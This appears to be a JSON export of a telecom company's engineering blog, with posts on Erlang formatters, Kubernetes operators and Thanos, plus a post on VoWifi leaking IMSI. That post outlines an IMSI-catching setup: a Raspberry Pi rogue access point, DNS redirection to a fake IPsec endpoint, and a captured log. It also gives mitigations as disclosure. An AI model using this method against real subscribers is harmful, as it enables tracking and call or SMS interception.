components =\\n+\\t [{invoke,\\n+\\t   #\'Invoke\'{invokeID\\n+\\t\\t\\t =\\n+\\t\\t\\t 1,\\n+\\t\\t     linkedID\\n+\\t\\t\\t =\\n+\\t\\t\\t asn1_NOVALUE,\\n+\\t\\t     operationCode\\n+\\t\\t\\t =\\n+\\t\\t\\t updateLocation,\\n+\\t\\t     parameter\\n+\\t\\t\\t =\\n+\\t\\t\\t #\'UpdateLocationArg\'{imsi\\n+\\t\\t\\t\\t\\t\\t  =\\n+\\t\\t\\t\\t\\t\\t  IMSI,\\n+\\t\\t\\t\\t\\t      \'msc-Number\'\\n+\\t\\t\\t\\t\\t\\t  =\\n+\\t\\t\\t\\t\\t\\t  CallingGTBCD,\\n+\\t\\t\\t\\t\\t      \'vlr-Number\'\\n+\\t\\t\\t\\t\\t\\t  =\\n+\\t\\t\\t\\t\\t\\t  CallingGTBCD}}}]},\\n```\\n\\nThere are also some issues with `erl_prettypr`; it throws an exception\\nwhen there are argumented macro functions.\\n\\n```erlang\\n-define(MACRO(), object).\\nfoo(?MACRO()) ->\\n  ok.\\n```\\n\\n```erlang\\n** exception exit: no_translation\\n     in function  io:put_chars/3\\n        called as io:put_chars(<0.4843.0>,unicode,\\n                               [...])\\n     in call from erl_tidy:output/4 (erl_tidy.erl, line 431)\\n     in call from erl_tidy:write_module/3 (erl_tidy.erl, line 413)\\n     in call from erl_tidy:file_2/2 (erl_tidy.erl, line 335)\\n     in call from erl_tidy:file_1/3 (erl_tidy.erl, line 310)\\n```\\n\\n## [rebar3_format](https://github.com/AdRoll/rebar3_format)\\n\\nI had an issue when installing this plugin. It was not as easy as\\nadding `rebar3_format` to plugins in the rebar3 config. The reason I\\nhad problems with it was that the plugin depends on\\n`inaka/katana_code` which for some reason did not get pulled in\\nproperly and was missing some vital files. The issue could be resolved\\nby deleting the user rebar3 cache (`rm -rf ~/.cache/rebar3/`) as\\nexplained in [this issue](https://github.com/AdRoll/rebar3_format/issues/80)\\n\\nAfter installation you need to specify where the source files for\\nformatting can be found. This would probably not be needed if we did\\nnot use an Erlang umberella project (an umberella project is when\\nthere are subapplications residing in your main application).  Here is\\nwhere I found out that the command line option `--files\\napps/**/{src,include}/*.?rl` is apparantly not the same as specifying\\n`{format, [{files, [\u201capps/**/{src,include}/*.?rl\u201d]}]}` in the\\nconfig. The command line options finds only one file, while the config\\nparameter works as expected.\\n\\nFormatting-wise it is similar to `erl_tidy`. This is because it uses\\ninakas `katana_code` which in its turn uses `erl_tidy`.\\n\\n\\n```diff\\n-           components =\\n-               [{invoke,\\n-                 #\'Invoke\'{\\n-                    invokeID = 1,linkedID = asn1_NOVALUE,\\n-                    operationCode = updateLocation,\\n-                    parameter =\\n-                        #\'UpdateLocationArg\'{\\n-                           imsi = IMSI,\\n-                           \'msc-Number\' = CallingGTBCD,\\n-                           \'vlr-Number\' = CallingGTBCD}}}]},\\n+                                      components =\\n+                                          [{invoke,\\n+                                            #\'Invoke\'{invokeID = 1,\\n+                                                      linkedID =\\n+                                                          asn1_NOVALUE,\\n+                                                      operationCode =\\n+                                                          updateLocation,\\n+                                                      parameter =\\n+                                                          #\'UpdateLocationArg\'{imsi\\n+                                                                                   =\\n+                                                                                   IMSI,\\n+                                                                               \'msc-Number\'\\n+                                                                                   =\\n+                                                                                   CallingGTBCD,\\n+                                                                               \'vlr-Number\'\\n+                                                                                   =\\n+                                                                                   CallingGTBCD}}}]},\\n```\\n\\nProblem is that both `erl_tidy` and `katana_code` have multiple issues\\nwith macros. It is hard to process format code which include macros\\nwithout preprocessing the macros.\\n\\n## [elvis](https://github.com/inaka/elvis)\\n\\nThis is a bonus; it is not a formatter but a linter.\\n\\nOne difference between formatters and linters are that formatters\\nchange the code into a uniform format, and linters warn or fail when\\nrules are broken. Linters can also check other things as nesting level.\\n\\nThis article by Brujo Benavides describe it pretty well.\\n\\n[Are formatters better than linters?](https://medium.com/@elbrujohalcon/are-formatters-better-than-linters-cbab91189be3)\\n\\nSetting it up you need to configure a ruleset and save in a special\\nElvis config file in the repo. This config specifies which linting\\nrules to apply to which files.\\n\\nFor me it took 8-9 minutes for it to execute linting on our code base\\nwith the example ruleset that is proposed by the tool.\\n\\n# Summary\\n\\nSadly I couldn\'t find any good alternatives that fits our\\npurposes. There are issues with macros, or execution time.\\n\\nI have to put this on the shelf again for a while, with just a dream\\nof uniform code.\\n\\n# Edit: 2020-10-01\\n\\nI forgot to update this blogpost, but something amazing happend.\\n\\nAfter I wrote this blog post I contacted the maintainer of\\nsteamroller, and told him about the slowness I experienced, and some\\nother difficulties.  One day later he had found and fixed an algorithm\\ngoing from an `O(n^2)` complexity to an `O(n)`. When retrying it on our\\ncode base, things went from minutes to seconds!\\n\\nHe also removed and improved some of the ambiguous configuration\\nparameters.\\n\\nI haven\'t yet started to look at the map formatting issues I had, but\\nmaybe that is improved as well. Anyway I\'ll have to leave that for\\nanother hackday."},{"id":"vowifi-imsi-leak/","metadata":{"permalink":"/blog/vowifi-imsi-leak/","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2020-03-30-catch-imsi-from-vowifi-session.md","source":"@site/../blog/2020-03-30-catch-imsi-from-vowifi-session.md","title":"VoWifi leaking IMSI","description":"4G offers more services than the earlier generation such as 3G and 2G. One of","date":"2020-03-30T00:00:00.000Z","formattedDate":"March 30, 2020","tags":[{"label":"telco","permalink":"/blog/tags/telco"},{"label":"4G","permalink":"/blog/tags/4-g"},{"label":"ePDG","permalink":"/blog/tags/e-pdg"},{"label":"VoWifi","permalink":"/blog/tags/vo-wifi"},{"label":"networking","permalink":"/blog/tags/networking"},{"label":"security","permalink":"/blog/tags/security"}],"readingTime":5.335,"hasTruncateMarker":true,"authors":[{"name":"Roger Skjetlein","title":"Senior Software Engineer","url":"https://www.linkedin.com/in/rskjetlein/","imageURL":"/img/author-photos/rs.jpg","key":"roger-skjetlein"}],"frontMatter":{"slug":"vowifi-imsi-leak/","title":"VoWifi leaking IMSI","date":"2020-03-30T00:00:00.000Z","tags":["telco","4G","ePDG","VoWifi","networking","security"],"authors":"roger-skjetlein"},"prevItem":{"title":"Choosing an Erlang formatter","permalink":"/blog/choosing-erlang-formatter/"},"nextItem":{"title":"Extending Kubernetes for our needs","permalink":"/blog/extending-k8s/"}},"content":"4G offers more services than the earlier generation such as 3G and 2G. One of\\nthe services has really have gained traction later years is VoLTE (Voice\\nover LTE) and VoWifi (Voice over Wifi) that we will go more in dept regarding security.\\n\\n\x3c!--truncate--\x3e\\n\\nVoWifi is beneficial in terms being able to use any Wifi connection offering public\\ninternet access thus extending and improving the coverage and connectivity.\\nThink of it as building our own cellular network, but\\nusing commodity wifi components instead and avoiding the strict regulation and\\nlicensing of spectrum.\\n\\n## What is IMSI\\n*The international mobile subscriber identity (IMSI) is a number that uniquely\\nidentifies every user of a cellular network. It is stored as a 64-bit field\\nand is sent by the mobile device to the network. It is also used for acquiring\\nother details of the mobile in the home location register (HLR) or as locally\\ncopied in the visitor location register. To prevent eavesdroppers from\\nidentifying and tracking the subscriber on the radio interface, the IMSI is sent\\nas rarely as possible and a randomly-generated TMSI is sent instead.*\\n\\n* [IMSI article](https://en.wikipedia.org/wiki/International_mobile_subscriber_identity)\\n\\n### Security implications\\nThe IMSI is a secret identifier stored on the sim and can be exploited in many\\nways once known. It is bound to the sim, so changing UE will not help.\\n\\nExamples:\\n* Locating user (UE)\\n* Intercepting calls\\n* Intercepting SMS (stealing two factor pin eg.)\\n* ..and more\\n\\n## How VoWifi works\\nWhen your phone is connected to datanetwork and with volte and vowifi enabled\\nthe device (UE) establish sip session directly to packetgateway via 4g, and via\\npublic internet to epdg (evolved packet data gateway) which is in essence a\\nipsec (ikev2) termination using SIM-AKA to authenticate UE. The ipsec comes into\\nplay since epdg is exposed publicly.\\n\\nWe won\'t go further in depth for volte and vowifi since there are already\\nexcellent articles about the matter:\\n* [Voice over WLAN](https://en.wikipedia.org/wiki/Voice_over_WLAN)\\n* [Voice over LTE](https://en.wikipedia.org/wiki/Voice_over_LTE)\\n\\n![VoWifi topology](/img/blog/vowifi-imsi-leak/vowifi.jpg)\\n\\nTo enable VoWifi on your device, please refer to your device manufacturer website:\\n\\n* [Android](https://support.google.com/phoneapp/answer/2811843?hl=en)\\n* [Apple](https://support.apple.com/en-in/HT203032)\\n\\nAlso check on your operator website if VoWifi is supported in your region. Please note that VoWifi is usually blocked when roaming.\\n\\n\\n## EPDG exposed on the public internet\\nThe Evolved Packet Data Gateway needs to be publicly available on the internet\\nsince UE needs to access it from an arbitrary no-trusted connection. The ipsec\\nwill secure and encrypt both the data and maintain the integrity of the\\nconnection throughout the session.\\n\\nThe UE finds the epdg termination point by looking dns records partly following\\na convention decided by 3gpp and typically looks like this in DNS:\\n\\n```\\nepdg.epc.mnc999.mcc999.pub.3gppnetwork.org. 3488 IN A 1.2.3.4\\nepdg.epc.mnc999.mcc999.pub.3gppnetwork.org. 3488 IN A 5.6.7.8\\n```\\n\\nFrom the DNS records we recognize the network operator (MNC) and the\\ncountry code (MCC).\\n\\nThe DNS records are registered under a delegated domain owned by GSMA and\\nusually are redelegated to operator under their own umbrella, like the example\\nmnc999.mcc999.pub.3gppnetwork.org.\\n\\n## The problem\\nWhen UE establish session to epdg it uses a vpn, a ipsec relationship using\\nIKEv2 for authentication, encryption and integrity.\\n\\nSo far the implementation works as intended and provides good security through\\nencryption and security.\\n\\nThe problem is not the VoWifi per see, by rather how ipsec establish the\\nsession. When UE connects to the epdg, it acts as a initiator and the epdg is\\ninherently passive since it cannot know where from (ip) the UE will come from.\\n\\n![sim-aka flow](/img/blog/vowifi-imsi-leak/sim-aka.png)\\n\\n### EAP-AKA exposes identity\\nVowifi as mentioned earlier utilises an encryption protocol based on the widely\\nadopted Extensible Authentication Protocol. EAP itself is just a protocol and\\ndoes not define the contents of the data or how exact the data exchanges look\\nlike. EAP-AKA unfortunately exposes the unencrypted user identity during\\nthe authentication session and in this case the user identity is equal to the\\nimsi.\\n\\n#### Solution\\nThis is the hardest problem to solve since it needs a security layer or settings\\nthat comes before ipsec starts to connect.\\n\\nThe proposed solutions\\n* Force the use of conservative peer for eap-aka/sim\\nand use pseudonym identity (tmsi) to avoid exposing imsi.\\n* Enable EAP-TTLS in addition to EAP-AKA/SIM\\n* Only connect trusted/encrypted AP\'s\\n\\n### Fake Ipsec termination exposes identity\\nBy impersonating a epdg by redirecting all dns requests for any\\n`pub.3gppnetwork.org.` to our own fake ipsec termination providing just enough\\nto catch the imsi.\\n\\nA raspberry pie can easily be setup to constantly scan for open wifi networks,\\nthen impersonating the ssid in hope of lure ue\'s to connect. Any UE set to use\\nVoWiFi connecting to the fake access point will give away their imsi.\\n\\nA wifi ssid scan example of what we can automate. In this case the Isfjell-Guest\\nwould have been picked to catch imsi since its open and unencrypted:\\n\\n![wifi-ssid](/img/blog/vowifi-imsi-leak/wlan-ssid.png)\\n\\nSnippet from the ipsec termination, UE (iPhone 8) exposes imsi several times:\\n```\\n13[ENC] parsed IKE_AUTH request 2 [ EAP/RES/AKA ]\\n13[IKE] \'09999994511******@wlan.mnc999.mcc999.3gppnetwork.org\' is not a reauth identity\\n13[IKE] \'09999994511******@wlan.mnc999.mcc999.3gppnetwork.org\' is not a pseudonym\\n13[IKE] received identity \'09999994511******@wlan.mnc999.mcc999.3gppnetwork.org\'\\n13[IKE] no EAP key found for 09999994511******@wlan.mnc999.mcc999.3gppnetwork.org to authenticate with AKA\\n13[LIB] tried 0 SIM providers, but none had a quintuplet for \'09999994511******@wlan.mnc999.mcc999.3gppnetwork.org\'\\n13[IKE] failed to map pseudonym/reauth identity \'09999994511******@wlan.mnc999.mcc999.3gppnetwork.org\', fallback to permanent identity request\\n13[ENC] generating IKE_AUTH response 2 [ EAP/REQ/AKA ]\\n13[NET] sending packet: from 192.168.17.1[500] to 192.168.17.24[500] (92 bytes)\\n09[NET] received packet: from 192.168.17.24[500] to 192.168.17.1[500] (140 bytes)\\n09[ENC] parsed IKE_AUTH request 3 [ EAP/RES/AKA ]\\n09[IKE] received identity \'09999994511******@wlan.mnc999.mcc999.3gppnetwork.org\'\\n09[IKE] no EAP key found for 09999994511******@wlan.mnc999.mcc999.3gppnetwork.org to authenticate with AKA\\n09[LIB] tried 0 SIM providers, but none had a quintuplet for \'09999994511******@wlan.mnc999.mcc999.3gppnetwork.org\'\\n09[IKE] EAP method EAP_AKA failed for peer 09999994511******@nai.epc.mnc999.mcc999.3gppnetwork.org\\n09[ENC] generating IKE_AUTH response 3 [ EAP/FAIL ]\\n```\\n\\n#### Solution\\nIpsec clients (UE) are able to verify the identity of the epdg by requesting\\nand validating a machine certificate proving it is the actual service belonging\\nto the requested dns address. This means when the client connects, the server\\nhas to provide a valid certificate containing the dns names and signed by a\\ntrusted CA.\\n\\n## Raspberry PI 4\\n\\nThe specific physical setup used for testing. Older PI\'s should work just fine and also\\nother platforms that can run dnsmasq, tshark and strongswan for ipsec with\\nsupport for eap-aka/sim.\\n\\n![rpi4 and battery](/img/blog/vowifi-imsi-leak/rpi4-batt.jpg)\\n\\n*white box is the rpi4 in a original casing and gray box is a battery bank*"},{"id":"extending-k8s/","metadata":{"permalink":"/blog/extending-k8s/","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2020-02-21-Extending-Kubernetes-Static-IP-Routing.md","source":"@site/../blog/2020-02-21-Extending-Kubernetes-Static-IP-Routing.md","title":"Extending Kubernetes for our needs","description":"We are using Kubernetes as our cluster scheduler and this serves us well. However we have a","date":"2020-02-21T00:00:00.000Z","formattedDate":"February 21, 2020","tags":[{"label":"infrastructure","permalink":"/blog/tags/infrastructure"},{"label":"kubernetes","permalink":"/blog/tags/kubernetes"},{"label":"networking","permalink":"/blog/tags/networking"},{"label":"AWS","permalink":"/blog/tags/aws"}],"readingTime":11.345,"hasTruncateMarker":true,"authors":[{"name":"Holger Ihrig","title":"Software Engineer for Session Management & Protocol Termination","url":"https://www.linkedin.com/in/hihrig/","imageURL":"/img/author-photos/hi.jpg","key":"holger-ihrig"}],"frontMatter":{"slug":"extending-k8s/","title":"Extending Kubernetes for our needs","date":"2020-02-21T00:00:00.000Z","tags":["infrastructure","kubernetes","networking","AWS"],"authors":"holger-ihrig"},"prevItem":{"title":"VoWifi leaking IMSI","permalink":"/blog/vowifi-imsi-leak/"},"nextItem":{"title":"Towards observability nirvana: infinite metric retention with Thanos","permalink":"/blog/metrics-unlimited-thanos"}},"content":"We are using Kubernetes as our cluster scheduler and this serves us well. However we have a\\nfew cases where we need to do some additional work.\\n\\n\x3c!--truncate--\x3e\\n\\nOne case for example is that we have to use static IPs for some of our services to connect to\\nTelecom companies as they expect a single IP address to bind to. This address needs to be fixed and\\nDNS records are not accepted either. We are running in AWS as well, so the reader might ask why are we not\\nusing Elastic IPs and adding them to the services? Good idea, but Telecom operators will not whitelist\\nan Elastic IP for you as there are no guarantees that it will belong to your company infrastructure forever. There\\nare also additional challenges when it comes to using Elastic IP in private subnet over VPN or direct connect.\\n\\nWe are a member of RIPE and do have a small subnet block for our own use, so we thought we could make use of\\nthat. As we own the block and AWS supports BYOIP (Bring your own IP-range), we created a special subnet with\\nsome Kubernetes nodes in it. This was not enough to make this work since we depended on a service always having\\nthe same IP attached to it, as well as the node running a pod having some very specific Routes set.\\n\\nWith this scenario in mind we set out to find solutions and all solutions we could think of required haggling\\nwith Kubernetes.\\n\\n## Extending Kubernetes\\n\\nThere are several ways to extend Kubernetes. All functionality in Kubernetes is build upon very nice and clean\\npublic APIs, or to say it with other words: There is no private API magic hidden somewhere. So lets look at\\ntwo ways on how to extend Kubernetes.\\n\\nPossible ways to go forward:\\n- Adding a scheduler extender\\n- Creating an operator/controller\\n\\nThere are more ways to extend Kubernetes, but these two ways will be the one we shall look at. Just for completeness\\nyou can as well also add another scheduler or change Kubernetes itself. However these possibilities have some serious\\ndownsides.\\n\\n### Adding a scheduler extender\\nThe Kubernetes scheduler checks for certain requirements before it schedules a pod onto a node. Some of these requirements\\nare hard requirements, like cpu, memory and number of pods. Other requirements are more soft, like if the pods are allowed to\\nbe packed together or in which AZ they are going to run. All of those requirements are collected and points given to each\\nnode on how well they meet the requirements. The node that fits best, gets chosen.\\n\\nAll of these are things the scheduler will do for you automatically, however it is also possible to give the cluster a\\n`KubeSchedulerConfiguration` object that will tell the scheduler to also reach out to a service for additional point scoring.\\nThe SchedulerConfiguration is a JSON file and for further explanations, please have a look at this\\nexcellent [blog post](https://developer.ibm.com/articles/creating-a-custom-kube-scheduler/).\\n\\nIn our case, we could have written a service that checks which IP Addresses are assigned to the Nodes and moved the Pods\\nonto those nodes. This would have required us to make sure that those nodes had all needed IP-Addresses all the time.\\nThat sounded not very enticing when doing cluster upgrades as it would have needed to be at least a semi-manual process.\\nSo we decided against this approach.\\n\\n### Creating an operator\\nAn Operator/Controller on the other hand is a component observing resources and then try to create the declared resources.\\nThe difference between a controller and an operator is basically that an operator is handling the lifecycle of an\\napplication, whereas a controller may control specific resources that are not associated with a specific application.\\nThey both use the controller pattern though and both can be implemented with the same toolset, so for simplicity sake in the\\ncontext of this article, we will consider them to be equal.\\n\\nOperators usually consists at least out of a **[CRD(CustomResourceDefinition)][2]**, an **event listener** and a **reconciliation loop**.\\nThe *CRD* basically creates a new type of resource and effectively implements a domain specific language for the operator. The whole description on what this deployment\\nneeds to look like and all its abilities need to be defined in the *CRD*. The operator will create an *event listener* for that\\n*CRD* as the primary resource and additional *event listeners* for the secondary resource (most likely pods in this example).\\nThe *event listener* will let the *reconciliation loop* know once a [CRUD][3] operation has been requested on either the primary or\\nsecondary resource. The *loop* will then try to bring the *CRD* into the desired state, depending on what operation has been\\nrequested. So in the Redis example it will either create the pods, update the pods, in the case of an upgrade it might blue/green\\ndeploy the pods or delete the pods. Basically things a human operator would do in this case, just in programmatic form, taking it\\nfrom a declarative form into existing resources.\\n\\nAs our initial problem was making services available on static IP addresses, we chose to explore this approach further,\\nbasically attaching additional IP addresses to the nodes running specific pods.\\n\\n## Building an Operator/Controller\\nFor building an operator, there are several frameworks out there, but we will only look at the [operator-framework](https://github.com/operator-framework/operator-sdk) in\\nthis article.\\n\\n### Operator-SDK\\nThe Operator framework is a project that is designed to help you get started on creating an operator. To achieve that,\\nit will generate quite a bit of boilerplate.\\n\\nThe Operator-SDK supports three different models of creating an operator:\\n- Helm\\n- Ansible\\n- Golang\\n\\nDepending on your choice of tool, you will be able to integrate deeper into Kubernetes or not.\\n\\n![operator-sdk-capabilites](/img/blog/operator/operator-capability-level.png \\"Operator sdk capabilities (Taken from the operator-sdk repo)\\")\\n*[Operator sdk capabilities][1]*\\n\\nAs we didn\'t want to be limited by our choice later on and wanted to expose metrics from our operator, we chose to\\nimplement our operator in golang. We will be using the operator-sdk version 0.12 for this.\\n\\n### What we want to do\\nLooking at the problem again, we need some way to make sure that a node that runs a specific pod, needs to\\nhave an IP address attached to it. This IP address will be given to connecting parties as a entry point to our\\nsystem and thus cannot change.\\n\\nFeatures it needs to support\\n- Reserve IP address from range\\n- Attach IP address to node running pod\\n- Detach IP address from node that is not running pod\\n- Move IP addresses around in case of node failure\\n\\nThis feature list already shows some things we will not and most likely cannot support. For example autoscaling of\\nreplica sets will not work as an IP address is bound to a node with an assigned pod. There is\\na 1-1 association here. However it is still possible to use the self-healing properties of Deployments\\nin this case.\\n\\nWhen thinking about modelling this behaviour, we basically decided on the following approach:\\n- Create a IP kind (for reserving the IP Address in the Range)\\n- Use annotations to attach the IP Address to a pod\\n\\nWe also thought about creating a StaticIPDeployment kind, but at the end decided against it, as\\nwe feared that the lifecycle management would be way more complicated if we needed to manage a deployment\\ninstead of just controlling the assignment of an IP Address.\\n\\nAfter all this is the first Operator we are going to write and didn\'t want to drown in complexity from day one.\\nWe would rather iterate and scrap everything after we tried it, then going too complex from the start.\\n\\n\\n### Implementation\\n\\nThe first thing you do when starting off a new operator, is that you initialize the directory of your\\noperator with the following command:\\n\\n```\\noperator-sdk new app-operator --repo <YOURREPO>\\n```\\n\\nThis will create some boilerplate folders and files for you and will look roughly like this:\\n\\n![operator-fs-structure](/img/blog/operator/operator-structure.png \\"Operator Folder Structure\\")\\n\\nThe next thing you might want to do is then add the boilerplate for a CRD and a Controller:\\n\\n```\\noperator-sdk add api --api-version=ip.wgtwo.com/v1alpha1 --kind=IP\\noperator-sdk add controller --api-version=ip.wgtwo.com/v1alpha1 --kind=IP\\n```\\n\\nAfter creating the boilerplate, your folder structure will look a lot like this:\\n\\n![operator-fs-structure-expanded](/img/blog/operator/operator-structure-expanded.png \\"Operator Folder Structure Expanded\\")\\n\\nThe most important files right now are in:\\n- cmd/manager/main.go (the main program that will run in the cluster)\\n- pkg/apis/ip/v1alpha1/ip_types.go (definition of the CRD)\\n- pkg/controller/ip_controller.go (event listener and reconciliation loop)\\n\\n#### Creating the CRD\\n\\nTo start off, we define how our CRD should look like to be able to manage our IP Address. We do this,\\nby creating structs in go that have all the fields our CRD shall have. This includes metadata, \\"spec\\" and\\n\\"status\\" fields.\\n\\nThere is also a bit of operator-sdk specific code we need to add. This is so that the sdk can generate the\\nopenapi spec and other auto-generated code.\\n\\n```\\n// +k8s:openapi-gen=true\\n// +kubebuilder:subresource:status\\n// +kubebuilder:resource:path=ips,scope=Cluster\\ntype IP struct {\\n\\tmetav1.TypeMeta   `json:\\",inline\\"`\\n\\tmetav1.ObjectMeta `json:\\"metadata,omitempty\\"`\\n\\n\\tSpec   IPSpec   `json:\\"spec,omitempty\\"`\\n\\tStatus IPStatus `json:\\"status,omitempty\\"`\\n}\\n```\\n\\nThe \\"spec\\" needs to contain all information the controller needs to create the resource.\\nThe \\"status\\" part needs to contain all the bookkeeping information the controller needs to work. In a way the\\n\\"status\\" fields are used as a database for operating Kubernetes (yes, this is oversimplified).\\n\\n```\\n// +k8s:openapi-gen=true\\ntype IPSpec struct {\\n\\tAddress string `json:\\"address\\"`\\n\\tReassign bool `json:\\"reassign,omitempty\\"`\\n}\\n\\n// IPStatus defines the observed state of IP\\n// +k8s:openapi-gen=true\\ntype IPStatus struct {\\n\\tAssigned bool   `json:\\"assigned\\"`\\n\\tClaimed  bool   `json:\\"claimed\\"`\\n\\tNode     string `json:\\"node,omitempty\\"`\\n\\tPod      string `json:\\"pod,omitempty\\"`\\n\\tOriginal IPSpec `json:\\"original,omitempty\\"`\\n}\\n```\\n\\nAs you can see our new IP Resource type, as defined by the CRD that we are gonna create from these structs, is\\ngoing to have two fields: \\"Address\\" and \\"Reassign\\".\\nThe corresponding \\"status\\" part of the resource, has a lot more fields, which we are using for bookkeeping.\\n\\nAfter we have created those structs and know how the CRD needs to look like, we actually auto-generate the CRD yaml:\\n```\\noperator-sdk generate k8s\\noperator-sdk generate openapi\\n```\\nNB: This changed since operator-sdk 0.15\\n\\n#### Creating the controller\\n\\nThere are two main parts to the controller. One part that creates a watcher on resources and one part\\nthat reconciles your resource (in our case the IP and Pods).\\n\\n##### Watching for resource changes\\nThe watch code is in our case in the `add` function of ip_controller.go:\\n```\\n\\t// Watch for changes to primary resource IP, as this always requires an action\\n\\terr = c.Watch(&source.Kind{Type: &ipv1alpha1.IP{}}, &handler.EnqueueRequestForObject{})\\n\\tif err != nil {\\n\\t\\treturn err\\n\\t}\\n\\n\\t// Create Filter list triggering on ip.wgtwo.com/ip as annotation\\n\\tpred := predicate.Funcs{\\n\\t\\t// Ignore the pod if it does not contain annotation ip.wgtwo.com/ip\\n\\t\\tCreateFunc: func(e event.CreateEvent) bool {\\n\\t\\t\\treturn hasAnnotation(e.Meta)\\n\\t\\t},\\n\\t\\tUpdateFunc: func(e event.UpdateEvent) bool {\\n\\t\\t\\tif hasAnnotation(e.MetaOld) || hasAnnotation(e.MetaNew){\\n\\t\\t\\t\\treturn true\\n\\t\\t\\t} else {\\n\\t\\t\\t\\treturn false\\n\\t\\t\\t}\\n\\t\\t},\\n\\t\\tDeleteFunc: func(e event.DeleteEvent) bool {\\n\\t\\t\\t// Evaluates to false if the object has been confirmed deleted.\\n\\t\\t\\treturn !e.DeleteStateUnknown\\n\\t\\t},\\n\\t}\\n\\t// Watch for all pods having the right annotation\\n\\terr = c.Watch(&source.Kind{Type: &corev1.Pod{}}, &handler.EnqueueRequestForObject{}, pred)\\n```\\nHere we are creating watchers for all changes to the `IP` resource and watchers for all create/update/delete operations on\\npods, if they have a specific annotation set.\\n\\nIf any of these conditions are met, the reconciliation loop will be triggered.\\n\\n##### Reconciliation\\n\\nThis is where the business logic of your operator/controller is sitting. The `Reconcile` function in `ip_controller.go` will\\nbe triggered whenever one of the watch conditions fits.\\nWe do not know which type of resource triggered the loop, so that is the first thing we need to figure out:\\n```\\noip := &ipv1alpha1.IP{}\\nerr := r.client.Get(context.TODO(), request.NamespacedName, oip)\\nif err == nil {\\n    ... yes it is a resource of kind IP ... go and do business\\n}\\n...\\nop := &corev1.Pod{}\\nerr = r.client.Get(context.TODO(), request.NamespacedName, op)\\nif err == nil {\\n    ... yes it is a resource of kind Pod ... go and do business\\n}\\n...\\n```\\n\\nIn these two code blocks, we are handling all the interactions for the primary resource of kind IP and the secondary\\nresource of type pod. Depending on what has happened last we have different scenarios.\\n\\nCases for the IP resource to consider:\\n- IP is new\\n- IP has been modified\\n- IP has been deleted\\n\\nCases for the Pod resource to consider:\\n- Annotation sticking the IP to the pod has been deleted\\n- IP needs to be assigned to a pod\\n- Pod has moved to another node\\n- Pod has been deleted\\n\\nWe will not go any further into the detail on what these parts are actually doing, as this is enough\\nto actually give you an idea on how this can be accomplished.\\n\\n\\n## Summary\\n\\nWe have been looking at how to expand Kubernetes to suit our needs better. Creating the Operator/Controller\\nhas taught us quite a bit about how Kubernetes works and has already saved us work in the past\\nfew months, especially on node failures.\\n\\nThe operator-sdk has been a great tool for us to solve this problem and we see that there is a lot of work\\ngoing into it, making it simpler to create operators. It might look intimidating at first, but is worth the effort and\\nwe think in the future Kubernetes operators will be the way how stateful components will be managed.\\n\\n\\n## Resources / Further Reading\\n\\n- Programming Kubernetes by Stefan Schimanski and Michael Hausenblas\\n- [Creating a custom kube-scheduler](https://developer.ibm.com/articles/creating-a-custom-kube-scheduler/)\\n- [Operator SDK](https://github.com/operator-framework/operator-sdk)\\n\\n[1]: https://github.com/operator-framework/operator-sdk/blob/master/README.md\\n[2]: https://kubernetes.io/docs/concepts/extend-kubernetes/api-extension/custom-resources/\\n[3]: https://en.wikipedia.org/wiki/Create,_read,_update_and_delete"},{"id":"metrics-unlimited-thanos","metadata":{"permalink":"/blog/metrics-unlimited-thanos","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2020-01-28-Thanos-infinite-metrics.md","source":"@site/../blog/2020-01-28-Thanos-infinite-metrics.md","title":"Towards observability nirvana: infinite metric retention with Thanos","description":"In the current DevOps world, our industry relies on the ability to observe and monitorize our infrastructure and","date":"2020-01-28T00:00:00.000Z","formattedDate":"January 28, 2020","tags":[{"label":"infrastructure","permalink":"/blog/tags/infrastructure"},{"label":"observability","permalink":"/blog/tags/observability"},{"label":"prometheus","permalink":"/blog/tags/prometheus"},{"label":"thanos","permalink":"/blog/tags/thanos"},{"label":"kubernetes","permalink":"/blog/tags/kubernetes"}],"readingTime":5.055,"hasTruncateMarker":true,"authors":[{"name":"Holger Ihrig","title":"Software Engineer for Session Management & Protocol Termination","url":"https://www.linkedin.com/in/hihrig/","imageURL":"/img/author-photos/hi.jpg","key":"holger-ihrig"}],"frontMatter":{"slug":"metrics-unlimited-thanos","title":"Towards observability nirvana: infinite metric retention with Thanos","date":"2020-01-28T00:00:00.000Z","tags":["infrastructure","observability","prometheus","thanos","kubernetes"],"authors":"holger-ihrig"},"prevItem":{"title":"Extending Kubernetes for our needs","permalink":"/blog/extending-k8s/"},"nextItem":{"title":"We killed the butler: Replacing Jenkins with Concourse","permalink":"/blog/replacing-jenkins-with-concourse"}},"content":"In the current DevOps world, our industry relies on the ability to observe and monitorize our infrastructure and\\nservices. **wgtwo** is no exception here and as we are operating in the TelCo space\\nwe wanted to know more about the usage patterns of our platform over days, months and even years.\\n\\n\x3c!--truncate--\x3e\\n\\nInternally we have been running Prometheus for a long time with a fairly limited retention of 30 days. This did not\\nallow us to look far enough back in time to make the observations we wanted to.\\nLuckily for us there already was a solution out there that would fill our needs and in addition to that make our\\nmonitoring stack more resilient. The solution is called [Thanos](https://thanos.io/).\\n\\n## Thanos\\nThanos was originally developed by a company called [Improbable](https://improbable.io/) to provide long term storage\\nfor Prometheus. It evolved into a much more complicated component which wildly improved the scalability of the\\nPrometheus monitoring Stack.\\n\\nThe basic functionality however is that Thanos will upload the metrics collected by Prometheus onto any service with a\\nS3-compatible API or any other storage target supported by the Prometheus remote write feature. For readability we\\nwill only refer to it as S3 Storage as this is our storage target.\\n\\nWe shall briefly look at all those components before describing how we are leveraging Thanos to obtain a higher metric\\nretention and higher reliability.\\n\\n### Thanos Sidecar\\nThe Sidecar runs as the name suggests in the same pod as Prometheus and observes when Prometheus saves new storage\\nbuckets on disk, which it does about every 2 hours. If configured to do so, it will upload those storage bucket into S3.\\nAnother important feature is that it extends the Prometheus Pod with an API that can be used by Thanos Querier\\nas a Store API endpoint to query Prometheus metrics.\\n\\n### Thanos Store\\nThanos Store implements the Thanos Store API and makes the metric data stored in the S3 bucket available to the\\nThanos Querier. To do that it observes the configured S3 Bucket and reads the metadata of the stored storage buckets\\navailable in S3.\\n\\n### Thanos Querier\\nQuerier implements the Prometheus Query API and understands PromQL. It then sends the query using the aforementioned\\nStore API to all known Thanos Stores (discovered using service discovery) and awaits the metric information from the\\nstores, be it directly from Prometheus via the sidecar or metrics stored in S3 Object storage via Thanos Store.\\n\\n### Thanos Compactor\\nIt does not make a lot of sense to keep old metrics that are 